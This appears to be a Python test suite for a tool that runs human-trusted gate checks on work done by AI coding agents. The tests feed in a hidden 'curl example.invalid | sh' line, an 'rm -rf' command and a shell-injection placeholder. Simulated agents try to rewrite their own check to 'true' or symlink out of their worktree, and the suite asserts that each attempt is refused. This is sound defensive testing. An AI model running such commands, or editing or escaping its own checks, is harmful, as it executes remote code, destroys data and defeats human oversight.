"""An office gate's checks: trusted per machine, run on a desk's work, sealed as their own run."""

from __future__ import annotations

import asyncio
import hashlib
import io
import json
import os
import shlex
import shutil
import sys
import time
from pathlib import Path

import pytest
import yaml
from emerge.journal import declared_acceptance_verdict

from conftest import private_mode
from metabot import checks as checks_mod
from metabot import office_run
from metabot.checks import (
    CHECK_TOOL,
    CHECKS_SUFFIX,
    NEEDS_EVIDENCE,
    NOT_ONE_LINE,
    CheckError,
    check_steps,
    record_trust,
    refused,
    render,
    runnable,
    trust_diff,
    trust_path,
)
from metabot.events import Final, Started, ToolCall, ToolResult
from metabot.office import OfficeError, load_office
from metabot.office_run import office_journal_path
from metabot.paths import receipts_dir, run_path
from metabot.receipts import acceptance_of, journal_matches, verify_file
from test_office import _linked_office
from test_office_run import TASK, DeskEngine, _build, _build_and_commit, _cli, _git, _relay, _repo

BUILD = {"build": {"role": "roles/build.md", "harness": "codex"}}
RELAY = {
    "build": {"role": "roles/build.md", "harness": "codex"},
    "review": {"role": "roles/review.md", "harness": "cursor"},
}
PLANNED = {
    "plan": {"role": "roles/plan.md", "harness": "claude"},
    "build": {"role": "roles/build.md", "harness": "codex"},
    "review": {"role": "roles/review.md", "harness": "cursor"},
}


def _set_checks(root: Path, checks: dict[str, str], commit: bool = True) -> None:
    """The office's one gate, with these checks; ``verdict`` is the owner's item."""
    path = root / "office.yaml"
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    data["gates"] = {
        "ready": {
            "owner": ["verdict"],
            "engineer": [item for item in checks if item != "verdict"] or ["tests"],
            "checks": checks,
        }
    }
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
    if commit:
        _git(root, "add", "-A")
        _git(root, "commit", "-q", "-m", "checks")


def _office(tmp_path: Path, checks: dict[str, str], desks=None, office_dir: str = ".") -> Path:
    root = _repo(tmp_path, desks or BUILD, office_dir)
    _set_checks(root, checks)
    return root


def _trusted(tmp_path: Path, checks: dict[str, str], **kw) -> Path:
    root = _office(tmp_path, checks, **kw)
    record_trust(load_office(root))
    return root


def _journal(run_id: str) -> dict:
    return json.loads((run_path(run_id) / "journal.json").read_text(encoding="utf-8"))


def _tree(root: Path) -> dict[str, str]:
    return {
        str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest()
        for p in sorted(root.rglob("*"))
        if p.is_file() and ".git" not in p.relative_to(root).parts
    }


async def _gone(pid: int, wait: float = 5.0) -> bool:
    """The process ended: there is no such process, or only a zombie left to reap."""
    deadline = time.monotonic() + wait
    while time.monotonic() < deadline:
        try:
            stat = Path(f"/proc/{pid}/stat").read_text(encoding="utf-8")
        except FileNotFoundError:
            return True
        if stat.rsplit(")", 1)[1].split()[0] == "Z":
            return True
        await asyncio.sleep(0.05)
    return False


@pytest.fixture
def engines():
    return {
        "codex": DeskEngine("codex", act=_build),
        "cursor": DeskEngine("cursor", act=lambda job: "REVIEW: fine"),
    }


# ── trust ───────────────────────────────────────────────────────────────────


async def test_checks_do_not_run_untrusted(tmp_path, engines):
    out = tmp_path / "ran"
    touch = f"touch {shlex.quote(str(out))}"
    root = _office(tmp_path, {"tests": touch, "lint": "true"})
    with pytest.raises(OfficeError) as caught:
        await _relay(root, engines, checks=True)
    message = str(caught.value)
    assert "not trusted on this machine" in message and "metabot office trust" in message
    assert f"  + ready:tests: {touch}" in message.splitlines()
    assert "  + ready:lint: true" in message.splitlines()
    assert engines["codex"].jobs == [] and not out.exists()
    result = await _relay(root, engines)  # without checks the office runs as before
    assert result.ok and result.rows[0].checks is None and not out.exists()


def test_a_changed_command_needs_trust_again(tmp_path):
    root = _office(tmp_path, {"tests": "pytest -q", "lint": "ruff check"})
    office = load_office(root)
    assert trust_diff(office).added == {"ready:tests": "pytest -q", "ready:lint": "ruff check"}
    record_trust(office)
    assert trust_diff(office).empty
    assert runnable(office) == ({"ready:tests": "pytest -q", "ready:lint": "ruff check"}, {})
    _set_checks(root, {"tests": "pytest -q -x"}, commit=False)
    changed = load_office(root)
    with pytest.raises(CheckError) as caught:
        runnable(changed)
    lines = str(caught.value).splitlines()
    assert "  ~ ready:tests: pytest -q" in lines and "    now: pytest -q -x" in lines
    assert "  - ready:lint: ruff check  (no longer in office.yaml)" in lines
    record_trust(changed)
    assert runnable(changed) == ({"ready:tests": "pytest -q -x"}, {})


def test_a_trust_record_that_does_not_read_is_refused(tmp_path):
    root = _office(tmp_path, {"tests": "true"})
    office = load_office(root)
    path = record_trust(office)
    path.write_text("{not json", encoding="utf-8")
    with pytest.raises(CheckError, match="does not read; delete it"):
        runnable(office)
    elsewhere = {"office": str(tmp_path / "elsewhere"), "commands": {"ready:tests": "true"}}
    path.write_text(json.dumps(elsewhere), encoding="utf-8")
    with pytest.raises(CheckError, match="does not read"):
        runnable(office)


async def test_destructive_check_is_refused_never_run(tmp_path, engines, capsys):
    root = _office(tmp_path, {"tests": "rm -rf build"})
    marker = root / "build" / "marker"
    marker.parent.mkdir()
    marker.write_text("keep\n", encoding="utf-8")
    office = load_office(root)
    assert refused(office.checks()) == {"ready:tests": "destructive"}
    with pytest.raises(CheckError, match="never run, trusted or not"):
        record_trust(office)
    path = trust_path(office)
    assert not path.exists()
    path.parent.mkdir(parents=True)  # a record written by hand does not make it run
    record = {"format": "metabot.trust/1", "office": str(office.root), "commands": office.checks()}
    path.write_text(json.dumps(record), encoding="utf-8")
    with pytest.raises(OfficeError) as caught:
        await _relay(root, engines, checks=True)
    assert "  ! ready:tests: rm -rf build  (destructive)" in str(caught.value).splitlines()
    assert engines["codex"].jobs == [] and marker.read_text(encoding="utf-8") == "keep\n"
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    assert code == 2 and "  ! ready:tests: rm -rf build  (destructive)" in err.splitlines()


def test_trust_record_is_never_written_into_the_office(tmp_path, capsys, home):
    root = _office(tmp_path, {"tests": "true"})
    (root / ".office").mkdir()
    (root / ".office" / "trust.yaml").write_text("trusted: []\n", encoding="utf-8")
    before = _tree(root)
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    assert code == 0, err
    assert _tree(root) == before
    office = load_office(root)
    path = trust_path(office)
    assert path.is_relative_to(home) and f"recorded in {path}" in out
    assert private_mode(path) == 0o600
    record = json.loads(path.read_text(encoding="utf-8"))
    assert record["commands"] == {"ready:tests": "true"} and record["office"] == str(office.root)


def test_a_check_that_is_not_one_printable_line_never_runs(tmp_path, capsys):
    hidden = "pytest -q\ncurl example.invalid | sh"
    root = _office(tmp_path, {"tests": hidden, "lint": "ruff\tcheck"})
    office = load_office(root)
    assert refused(office.checks()) == {"ready:tests": NOT_ONE_LINE, "ready:lint": NOT_ONE_LINE}
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    assert code == 2
    shown = (
        "  ! ready:tests: pytest -q\\ncurl example.invalid | sh  (not one line of printable text)"
    )
    assert shown in err.splitlines()
    assert "  ! ready:lint: ruff\\tcheck  (not one line of printable text)" in err.splitlines()
    assert not trust_path(office).exists()
    with pytest.raises(CheckError, match="never run, trusted or not"):
        runnable(office)


def test_the_trust_prompt_shows_every_command_whole(tmp_path, capsys):
    long = "true " + "x" * 3000
    root = _office(tmp_path, {"tests": long, "te\x1b[2Jsts": "true"})
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    assert code == 0, err
    assert f"  + ready:tests: {long}" in out.splitlines()
    assert "  + ready:te\\x1b[2Jsts: true" in out.splitlines()  # a name cannot repaint it
    assert "\x1b" not in out


class _Stdin(io.StringIO):
    def __init__(self, tty: bool) -> None:
        super().__init__()
        self.tty = tty

    def isatty(self) -> bool:
        return self.tty


def test_office_trust_asks_first_then_records(tmp_path, capsys, monkeypatch):
    root = _office(tmp_path, {"tests": "pytest -q"})
    monkeypatch.setattr(sys, "stdin", _Stdin(tty=False))
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root))
    assert code == 2 and "trust asks first; run it in a terminal, or pass --yes" in err
    assert "  + ready:tests: pytest -q" in out.splitlines()
    assert "runs code the desks wrote, as you, with your environment" in out
    assert not trust_path(load_office(root)).exists()
    monkeypatch.setattr(sys, "stdin", _Stdin(tty=True))
    answers = iter(["n", "y"])
    monkeypatch.setattr("builtins.input", lambda prompt="": next(answers))
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root))
    assert code == 1 and "not trusted" in out
    assert not trust_path(load_office(root)).exists()
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root))
    assert code == 0 and "trusted on this machine; recorded in" in out
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root))
    assert code == 0 and "gate checks are trusted on this machine already" in out
    assert next(answers, None) is None


def test_office_trust_with_no_checks_has_nothing_to_trust(tmp_path, capsys):
    root = _repo(tmp_path, BUILD)
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    assert code == 0 and "there is nothing to trust" in out


@pytest.mark.parametrize("start", ["the main tree", "a worktree git cannot read"])
def test_an_office_whose_folder_name_is_not_utf_8_is_trusted(tmp_path, capsys, start):
    team, here = _linked_office(tmp_path / os.fsdecode(b"caf\xe9"))  # its .git file holds bytes
    _set_checks(team, {"tests": "true"}, commit=False)
    record = team.parent / ".git" / "worktrees" / "linked"
    record.chmod(0o000)  # git cannot read the worktree by its record: the office is the main's
    try:
        if os.access(record, os.X_OK):
            pytest.skip("this user enters any folder")
        folder = team if start == "the main tree" else here
        code, out, err = _cli(capsys, "office", "trust", "--dir", str(folder), "--yes")
    finally:
        record.chmod(0o755)
    assert code == 0 and "trusted on this machine" in out, err  # before: a traceback
    assert runnable(load_office(team)) == ({"ready:tests": "true"}, {})


def test_office_trust_names_a_home_whose_name_is_not_utf_8(tmp_path, capsys, monkeypatch):
    root = _office(tmp_path, {"tests": "true"})
    monkeypatch.setenv("METABOT_HOME", str(tmp_path / os.fsdecode(b"caf\xe9-home")))
    code, out, err = _cli(capsys, "office", "trust", "--dir", str(root), "--yes")
    # before: a traceback, once the trust was recorded
    assert code == 0 and "recorded in" in out and "caf\\udce9-home" in out, err
    assert runnable(load_office(root)) == ({"ready:tests": "true"}, {})


# ── running them ────────────────────────────────────────────────────────────


async def test_passing_checks_give_declared_acceptance_pass(tmp_path, engines):
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"})
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert row.ok and row.checks == "pass" and row.error is None
    checks_id = row.run_id + CHECKS_SUFFIX
    assert row.checks_receipt is not None and row.checks_receipt.name == f"{checks_id}.json"
    assert verify_file(row.checks_receipt).valid and journal_matches(checks_id)
    assert acceptance_of(row.checks_receipt) == "pass"
    assert acceptance_of(row.receipt) is None  # the desk's own run declares nothing
    journal = _journal(checks_id)
    assert journal["criteria"] == {"exit_zero": True}
    [step] = journal["steps"]
    assert step["tool"] == CHECK_TOOL and step["output"]["exit_code"] == 0
    assert step["args"] == {"gate": "ready", "item": "tests", "command": "test -f feature.txt"}
    assert journal["meta"]["parent"] == row.run_id and journal["meta"]["status"] == "ok"
    # whoever holds the journal judges it again by the one rule, and gets the same verdict
    sealed = [v for v in journal["verdicts"] if v["check"] == "declared_acceptance"]
    assert sealed == [declared_acceptance_verdict(journal["criteria"], journal["steps"])]
    record = json.loads(office_journal_path(result.office_run_id).read_text(encoding="utf-8"))
    assert record["checks"] == ["ready:tests"]
    assert record["desks"][0]["checks"] == "pass"
    assert record["desks"][0]["checks_receipt"] == str(row.checks_receipt)


async def test_a_failing_check_gives_fail_naming_the_item(tmp_path, engines):
    root = _trusted(tmp_path, {"tests": "test -f missing.txt", "lint": "true"}, desks=RELAY)
    result = await _relay(root, engines, checks=True)
    [row] = result.rows  # the relay stopped at the build desk
    assert not result.ok and not row.ok
    assert row.checks == "fail: ready:tests exit 1"
    assert row.error == "the gate's checks failed"
    assert engines["cursor"].jobs == []
    assert acceptance_of(row.checks_receipt) == "fail"
    assert [s["success"] for s in _journal(row.run_id + CHECKS_SUFFIX)["steps"]] == [False, True]
    assert _git(root, "show", f"{row.branch}:feature.txt") == "hello\n"  # its work stays


async def test_a_failing_engine_runs_no_checks(tmp_path):
    out = tmp_path / "ran"
    root = _trusted(tmp_path, {"tests": f"touch {shlex.quote(str(out))}"})
    engines = {"codex": DeskEngine("codex", act=_build, fail="codex exited 1")}
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert not row.ok and row.checks is None and row.checks_receipt is None
    assert not out.exists()
    assert not (receipts_dir() / f"{row.run_id}{CHECKS_SUFFIX}.json").exists()
    assert row.commit and _git(root, "show", f"{row.branch}:feature.txt") == "hello\n"


async def test_a_desk_that_commits_its_own_work_is_still_checked(tmp_path):
    root = _trusted(tmp_path, {"tests": "test -f missing.txt"})
    result = await _relay(root, {"codex": DeskEngine("codex", act=_build_and_commit)}, checks=True)
    [row] = result.rows
    assert not row.ok and row.checks == "fail: ready:tests exit 1"
    assert row.commit == _git(root, "rev-parse", f"refs/heads/{row.branch}").strip()
    assert row.stat == (1, 1, 0) and result.offer == []


class BashFails(DeskEngine):
    """Runs the tests and sees them fail, then builds."""

    async def run(self, job, *, board=None, approve):
        self.jobs.append(job)
        yield Started("s-codex", job.model)
        yield ToolCall("b1", "Bash", {"command": "pytest -q"})
        yield ToolResult("b1", {"exit_code": 1, "stdout": "1 failed"}, False)
        yield Final(_build(job), "s-codex")


async def test_engine_steps_do_not_count_toward_the_gate(tmp_path):
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"})
    engines = {"codex": BashFails("codex")}
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert row.ok and row.checks == "pass"
    assert acceptance_of(row.checks_receipt) == "pass"
    desk = _journal(row.run_id)
    assert [s["output"].get("exit_code") for s in desk["steps"]] == [1]  # kept, not judged
    assert "criteria" not in desk
    assert all(s["tool"] == CHECK_TOOL for s in _journal(row.run_id + CHECKS_SUFFIX)["steps"])


async def test_check_timeout_stops_its_group(tmp_path, engines, monkeypatch):
    pid_file = tmp_path / "bg.pid"
    q = shlex.quote(str(pid_file))
    slow = f"sleep 30 >/dev/null 2>&1 & echo $! > {q}; sleep 30"
    root = _trusted(tmp_path, {"slow": slow, "tests": "true"})
    monkeypatch.setattr(checks_mod, "CHECK_TIMEOUT_S", 0.5)
    began = time.monotonic()
    result = await _relay(root, engines, checks=True)
    assert time.monotonic() - began < 15
    [row] = result.rows
    assert row.checks == "fail: ready:slow timed out" and not row.ok
    first, second = _journal(row.run_id + CHECKS_SUFFIX)["steps"]
    assert first["output"]["exit_code"] == 124 and first["output"]["timed_out"] is True
    assert second["success"]  # the next check still ran
    assert await _gone(int(pid_file.read_text(encoding="utf-8")))


async def test_a_check_leaves_nothing_running(tmp_path, engines):
    pid_file = tmp_path / "bg.pid"
    q = shlex.quote(str(pid_file))
    root = _trusted(tmp_path, {"tests": f"sleep 30 >/dev/null 2>&1 & echo $! > {q}"})
    result = await _relay(root, engines, checks=True)
    assert result.rows[0].checks == "pass"
    assert await _gone(int(pid_file.read_text(encoding="utf-8")))


async def test_a_check_that_needs_evidence_is_skipped_and_said(tmp_path, engines):
    checks = {"tests": "test -f feature.txt", "verdict": "grep -q yes {evidence}"}
    root = _trusted(tmp_path, checks)
    result = await _relay(root, engines, checks=True)
    assert result.checks_skipped == {"ready:verdict": NEEDS_EVIDENCE}
    [row] = result.rows
    assert row.ok and row.checks == "pass"
    journal = _journal(row.run_id + CHECKS_SUFFIX)
    assert [s["args"]["item"] for s in journal["steps"]] == ["tests"]
    assert journal["meta"]["checks_skipped"] == {"ready:verdict": NEEDS_EVIDENCE}
    record = json.loads(office_journal_path(result.office_run_id).read_text(encoding="utf-8"))
    assert record["checks_skipped"] == {"ready:verdict": NEEDS_EVIDENCE}
    _set_checks(root, {"verdict": "grep -q yes {evidence}"})
    record_trust(load_office(root))
    with pytest.raises(OfficeError, match="no check can run headless"):
        await _relay(root, engines, checks=True)


async def test_checks_run_from_the_office_folder_with_placeholders_and_env(
    tmp_path, engines, monkeypatch
):
    out = tmp_path / "out"
    out.mkdir()
    o = shlex.quote(str(out))
    command = (
        f"pwd > {o}/where; printf '%s|' {{gate}} {{item}} {{thread}} {{estate}} > {o}/values; "
        f"env | grep '^DESK_' | sort > {o}/env"
    )
    desks = {"build": {"role": "roles/build.md", "harness": "codex", "cwd": "src"}}
    root = _office(tmp_path, {"tests": command}, desks=desks, office_dir="ops")
    (root / "src").mkdir()
    (root / "src" / "keep.txt").write_text("\n", encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "src")
    record_trust(load_office(root))
    monkeypatch.setenv("DESK_EVIDENCE", "stale, from the shell that started the run")
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert row.ok, row.error
    office_in_wt = Path(engines["codex"].jobs[0].cwd).parent  # the desk worked in ops/src
    assert office_in_wt.name == "ops"
    assert Path((out / "where").read_text(encoding="utf-8").strip()) == office_in_wt.resolve()
    gate, item, thread, estate, _ = (out / "values").read_text(encoding="utf-8").split("|")
    assert (gate, item, thread) == ("ready", "tests", row.run_id)
    assert Path(estate).resolve() == office_in_wt.resolve()
    env = (out / "env").read_text(encoding="utf-8").splitlines()
    assert {"DESK_GATE=ready", "DESK_ITEM=tests", f"DESK_THREAD={row.run_id}"} <= set(env)
    assert f"DESK_ESTATE={estate}" in env
    assert not any(line.startswith("DESK_EVIDENCE=") for line in env)


def test_placeholders_are_shell_quoted():
    values = {"item": "a b; touch x", "gate": "ready"}
    assert render("echo {item} {gate}", values) == "echo 'a b; touch x' ready"


async def test_a_desk_cannot_change_its_own_checks(tmp_path, engines):
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"})

    def rewrite(job):
        path = Path(job.cwd) / "office.yaml"
        data = yaml.safe_load(path.read_text(encoding="utf-8"))
        data["gates"]["ready"]["checks"]["tests"] = "true"
        path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
        return "made the gate easy"

    engines["codex"].act = rewrite
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert row.checks == "fail: ready:tests exit 1"  # the person's command judged it
    [step] = _journal(row.run_id + CHECKS_SUFFIX)["steps"]
    assert step["args"]["command"] == "test -f feature.txt"
    assert "tests: 'true'" in _git(root, "show", f"{row.branch}:office.yaml")  # shown, not obeyed


async def test_a_desk_cannot_point_the_checks_outside_its_worktree(tmp_path, engines):
    outside = tmp_path / "outside"
    outside.mkdir()
    root = _trusted(tmp_path, {"tests": "touch ran"}, office_dir="ops")

    def escape(job):
        office = Path(job.cwd)  # the office folder in the worktree
        shutil.rmtree(office)
        office.symlink_to(outside, target_is_directory=True)
        return "moved the office"

    engines["codex"].act = escape
    result = await _relay(root, engines, checks=True)
    [row] = result.rows
    assert row.checks == "fail: ready:tests exit 127" and not row.ok
    assert not (outside / "ran").exists()
    [step] = _journal(row.run_id + CHECKS_SUFFIX)["steps"]
    assert "not a folder inside the desk's worktree" in step["output"]["stderr"]


async def test_a_check_that_cannot_start_fails(tmp_path):
    steps = [s async for s in check_steps({"ready:tests": "true"}, tmp_path / "gone", "t")]
    assert [s["output"]["exit_code"] for s in steps] == [127]
    assert not steps[0]["success"]


async def test_what_a_check_leaves_is_not_the_desks_work(tmp_path, engines, capsys):
    leaves = "touch leftover.txt && mkdir -p cache && touch cache/x && echo more >> app.txt"
    root = _trusted(tmp_path, {"tests": f"test -f feature.txt && {leaves}"}, desks=RELAY)
    result = await _relay(root, engines, checks=True)
    assert result.ok and [r.checks for r in result.rows] == ["pass", None]  # review wrote nothing
    build, review = result.rows
    files = _git(root, "ls-tree", "-r", "--name-only", build.branch).split()
    assert "feature.txt" in files and "leftover.txt" not in files and "cache/x" not in files
    assert _git(root, "show", f"{build.branch}:app.txt") == "v1\n"
    assert build.stat == (1, 1, 0)
    trees = [Path(job.cwd) for job in (*engines["codex"].jobs, *engines["cursor"].jobs)]
    assert _git(trees[0], "status", "--porcelain") == ""
    assert _git(trees[1], "status", "--porcelain") == "?? .metabot/\n"  # the inbox stays
    assert (trees[1] / ".metabot" / "inbox" / "build.md").is_file()
    code, out, err = _cli(
        capsys, "desks", "clean", result.office_run_id, "--dir", str(root), "--yes"
    )
    assert code == 0, out + err
    assert not any(tree.exists() for tree in trees)


async def test_a_copy_whose_checks_fail_is_not_offered_to_pick(tmp_path):
    desks = {
        "build": {"role": "roles/build.md", "harness": "codex", "fan": 2},
        "review": {"role": "roles/review.md", "harness": "cursor"},
    }
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"}, desks=desks)

    def only_the_first(job):
        if Path(job.cwd).name == "build.1":
            return _build(job)
        (Path(job.cwd) / "other.txt").write_text("not the feature\n", encoding="utf-8")
        return "built other.txt"

    engines = {
        "codex": DeskEngine("codex", act=only_the_first),
        "cursor": DeskEngine("cursor", act=_build),  # starts where the copies did; redoes one
    }
    result = await _relay(root, engines, checks=True)
    rows = {row.label: row for row in result.rows}
    assert rows["build.1"].ok and rows["build.1"].checks == "pass"
    assert not rows["build.2"].ok and rows["build.2"].checks == "fail: ready:tests exit 1"
    assert rows["review"].ok
    [job] = engines["cursor"].jobs
    assert rows["build.1"].branch in job.prompt and rows["build.2"].branch not in job.prompt
    assert _journal(rows["review"].run_id)["meta"]["parent"] == rows["build.1"].run_id


async def test_a_cancelled_check_is_sealed_with_no_verdict(tmp_path, engines, home):
    out = tmp_path / "out"
    out.mkdir()
    o = shlex.quote(str(out))
    root = _trusted(tmp_path, {"tests": "true", "slow": f"echo $$ > {o}/pid; sleep 30"})
    task = asyncio.ensure_future(_relay(root, engines, checks=True))
    pid_file = out / "pid"
    for _ in range(200):
        if pid_file.is_file() and pid_file.read_text(encoding="utf-8").strip():
            break
        await asyncio.sleep(0.05)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    assert await _gone(int(pid_file.read_text(encoding="utf-8")))
    [path] = (home / "offices").glob("*.json")
    [row] = json.loads(path.read_text(encoding="utf-8"))["desks"]
    assert row["error"] == "cancelled" and not row["ok"] and row["checks"] is None
    assert row["commit"]  # the desk's work was committed before its checks
    receipt = row["checks_receipt"]
    assert verify_file(receipt).valid and acceptance_of(receipt) is None
    journal = _journal(row["run_id"] + CHECKS_SUFFIX)
    assert journal["meta"]["status"] == "cancelled" and "criteria" not in journal
    assert [s["args"]["item"] for s in journal["steps"]] == ["tests"]  # what ran is sealed
    assert _git(Path(engines["codex"].jobs[0].cwd), "status", "--porcelain") == ""


# ── through the CLI ─────────────────────────────────────────────────────────


def test_office_run_checks_through_the_cli(tmp_path, capsys, monkeypatch, engines):
    checks = {"tests": "test -f feature.txt", "verdict": "grep -q yes {evidence}"}
    root = _office(tmp_path, checks)
    monkeypatch.setattr(office_run, "get_engine", lambda name: engines[name])
    code, out, err = _cli(capsys, "office", "run", "--dir", str(root), "--checks", "-q", TASK)
    assert code == 2 and "  + ready:tests: test -f feature.txt" in err.splitlines()
    assert engines["codex"].jobs == []
    assert _cli(capsys, "office", "trust", "--dir", str(root), "--yes")[0] == 0
    code, out, err = _cli(capsys, "office", "run", "--dir", str(root), "--checks", "-q", TASK)
    assert code == 0, err
    office_id = next(w for w in out.split() if w.startswith("mb-"))
    [line] = [x for x in out.splitlines() if x.strip().startswith("build")]
    assert "checks pass" in line
    skipped = (
        "  check ready:verdict skipped: needs {evidence}, which a person names when delivering"
    )
    assert skipped in out.splitlines()
    code, out, err = _cli(capsys, "receipts", "show", office_id)
    assert code == 0 and "checks pass (receipt valid)" in out
    assert _cli(capsys, "receipts", "verify", f"{office_id}.build{CHECKS_SUFFIX}")[0] == 0
    code, out, err = _cli(capsys, "office", "run", "--dir", str(root), "-q", TASK)
    assert code == 0 and "checks" not in out


# ── a desk that changed nothing ─────────────────────────────────────────────


def _planned_engines() -> dict:
    return {
        "claude": DeskEngine("claude", act=lambda job: "PLAN: write feature.txt"),
        "codex": DeskEngine("codex", act=_build),
        "cursor": DeskEngine("cursor", act=lambda job: "REVIEW: fine"),
    }


async def test_a_desk_that_changed_no_file_is_not_checked(tmp_path):
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"}, desks=PLANNED)
    result = await _relay(root, _planned_engines(), checks=True)
    assert result.ok and [r.ok for r in result.rows] == [True, True, True]
    plan, build, review = result.rows
    assert (plan.checks, build.checks, review.checks) == (None, "pass", None)
    assert plan.commit is None and review.commit is None
    assert plan.checks_receipt is None and review.checks_receipt is None
    assert verify_file(build.checks_receipt).valid
    assert not (receipts_dir() / f"{plan.run_id}{CHECKS_SUFFIX}.json").exists()


def test_the_cli_says_which_desks_changed_no_file(tmp_path, capsys, monkeypatch):
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"}, desks=PLANNED)
    engines = _planned_engines()
    monkeypatch.setattr(office_run, "get_engine", lambda name: engines[name])
    code, out, err = _cli(capsys, "office", "run", "--dir", str(root), "--checks", "-q", TASK)
    assert code == 0, err
    rows = {line.split()[0]: line for line in out.splitlines() if line.startswith("  ")}
    assert "checks - (no file changed)" in rows["plan"]
    assert "checks pass" in rows["build"]
    assert "checks - (no file changed)" in rows["review"]
    assert "no check ran" not in out
    office_id = next(w for w in out.split() if w.startswith("mb-"))
    code, shown, err = _cli(capsys, "receipts", "show", office_id)
    assert code == 0, err
    shown_rows = {line.split()[0]: line for line in shown.splitlines() if line.startswith("  ")}
    assert "checks - (no file changed)" in shown_rows["plan"]
    assert "checks pass (receipt valid)" in shown_rows["build"]


def test_no_check_ran_is_said(tmp_path, capsys, monkeypatch):
    plan_only = {"plan": PLANNED["plan"]}
    root = _trusted(tmp_path, {"tests": "test -f feature.txt"}, desks=plan_only)
    engines = _planned_engines()
    monkeypatch.setattr(office_run, "get_engine", lambda name: engines[name])
    code, out, err = _cli(capsys, "office", "run", "--dir", str(root), "--checks", "-q", TASK)
    assert code == 0, err
    assert "  no check ran: no desk changed a file" in out.splitlines()


def _hand_edited_office(tmp_path: Path) -> Path:
    root = tmp_path / "office"
    root.mkdir()
    (root / "r.md").write_text("role\n", encoding="utf-8")
    (root / "office.yaml").write_text(
        "name: t\n"
        "gates: {ready: {owner: [verdict], engineer: [tests], checks: {tests: 'true'}}}\n"
        "desks: {d: {role: r.md, harness: claude}}\n",
        encoding="utf-8",
    )
    return root


def test_a_trust_record_that_is_not_json_is_refused(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    path = record_trust(office)
    path.write_text("{not json", encoding="utf-8")
    with pytest.raises(CheckError, match="does not read"):
        runnable(office)


def test_a_trust_record_with_the_wrong_shape_is_refused(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    path = record_trust(office)
    path.write_text(
        json.dumps({"commands": ["true"], "office": str(office.root)}), encoding="utf-8"
    )
    with pytest.raises(CheckError, match="does not read"):
        runnable(office)
    path.write_text(
        json.dumps({"commands": {"ready:tests": ["true"]}, "office": str(office.root)}),
        encoding="utf-8",
    )
    with pytest.raises(CheckError):
        runnable(office)


def test_a_record_for_another_office_is_refused(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    path = record_trust(office)
    data = json.loads(path.read_text(encoding="utf-8"))
    data["office"] = str(tmp_path / "elsewhere")
    path.write_text(json.dumps(data), encoding="utf-8")
    with pytest.raises(CheckError, match="does not read"):
        runnable(office)


def test_a_record_whose_commands_differ_asks_again(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    path = record_trust(office)
    data = json.loads(path.read_text(encoding="utf-8"))
    data["commands"]["ready:tests"] = "false"
    path.write_text(json.dumps(data), encoding="utf-8")
    with pytest.raises(CheckError, match="not trusted"):
        runnable(office)


def test_a_symlink_in_trust_is_refused(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    path = record_trust(office)
    body = path.read_text(encoding="utf-8")
    path.unlink()
    other = tmp_path / "elsewhere.json"
    other.write_text(body, encoding="utf-8")
    path.symlink_to(other)
    with pytest.raises(CheckError, match="does not read"):
        runnable(office)


def test_trust_as_a_file_is_a_named_error(tmp_path, home):
    office = load_office(_hand_edited_office(tmp_path))
    trust = home / "trust"
    trust.parent.mkdir(parents=True, exist_ok=True)
    trust.write_text("not a directory\n", encoding="utf-8")
    with pytest.raises(CheckError, match="trust"):
        record_trust(office)
